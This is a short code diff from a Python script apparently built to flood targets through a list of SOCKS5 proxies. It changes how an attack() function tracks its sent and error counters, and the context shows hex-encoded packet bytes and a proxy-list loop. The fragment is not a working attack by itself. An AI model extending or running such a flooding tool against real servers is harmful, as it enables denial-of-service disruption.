@@ -10,6 +10,9 @@ import wget
 from colorama import init
 from colorama import Fore, Back, Style
 
+sent = 0
+errors = 0
+
 try:
 	message1 = codecs.decode("081e77da","hex_codec")
 	message2 = codecs.decode("081e7eda","hex_codec")
@@ -48,8 +51,8 @@ def info_print(sent, errors):
 		print(Fore.GREEN + "Sent: " + str(sent) + " " + Fore.RED + "Errors: " + str(errors))
 
 def attack():
-	sent = 0
-	errors = 0
+	global sent
+	global errors
 	with open(r"socks5.txt", "r") as file:
 		for line in file:
 			try:
